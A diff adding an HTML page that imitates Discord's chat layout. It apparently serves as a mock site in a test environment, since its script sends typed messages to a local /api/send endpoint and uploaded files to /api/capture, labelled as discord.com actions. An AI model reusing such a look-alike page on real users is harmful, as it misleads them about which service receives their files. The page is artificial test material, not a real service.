@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Discord</title>
+    <style>
+        body { font-family: 'Helvetica Neue', Arial, sans-serif; margin: 0; background: #36393f; color: #dcddde; }
+        .sidebar { width: 240px; background: #2f3136; position: fixed; height: 100%; padding: 12px 0; }
+        .sidebar .channel { padding: 6px 16px; cursor: pointer; font-size: 14px; }
+        .sidebar .channel:hover { background: #393c43; }
+        .main { margin-left: 240px; padding: 16px; }
+        .header { border-bottom: 1px solid #202225; padding-bottom: 12px; margin-bottom: 16px; font-size: 16px; font-weight: 600; }
+        .message-box { position: fixed; bottom: 0; left: 240px; right: 0; padding: 16px; background: #36393f; }
+        .message-box textarea { width: 100%; background: #40444b; border: none; border-radius: 8px; color: #dcddde; padding: 12px; font-size: 14px; resize: none; box-sizing: border-box; }
+        .message-box textarea:focus { outline: none; }
+        button { background: #5865f2; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; margin-top: 8px; }
+        .upload-area { background: #40444b; border: 2px dashed #5865f2; border-radius: 8px; padding: 20px; text-align: center; margin: 16px 0; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="sidebar">
+        <div class="channel"># general</div>
+        <div class="channel"># engineering</div>
+        <div class="channel"># random</div>
+        <div class="channel"># project-updates</div>
+    </div>
+    <div class="main">
+        <div class="header"># general</div>
+        <div class="upload-area" id="upload-area">
+            <p>Drop files here or click to upload</p>
+            <input type="file" id="file-input" style="display:none" multiple>
+        </div>
+        <div class="message-box">
+            <textarea id="message" rows="2" placeholder="Message #general"></textarea>
+            <button onclick="sendMessage()">Send</button>
+            <button onclick="document.getElementById('file-input').click()">Attach File</button>
+        </div>
+    </div>
+    <script>
+        function sendMessage() {
+            const msg = document.getElementById('message').value;
+            if (!msg) return;
+            fetch('/api/send', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({site: 'discord.com', action: 'send_message', channel: '#general', content: msg})
+            });
+            document.getElementById('message').value = '';
+        }
+        document.getElementById('upload-area').onclick = function() { document.getElementById('file-input').click(); };
+        document.getElementById('file-input').onchange = function(e) {
+            const fd = new FormData();
+            fd.append('site', 'discord.com');
+            fd.append('action', 'upload_file');
+            for (const f of e.target.files) fd.append('file', f);
+            fetch('/api/capture', {method: 'POST', body: fd});
+        };
+    </script>
+</body>
+</html>
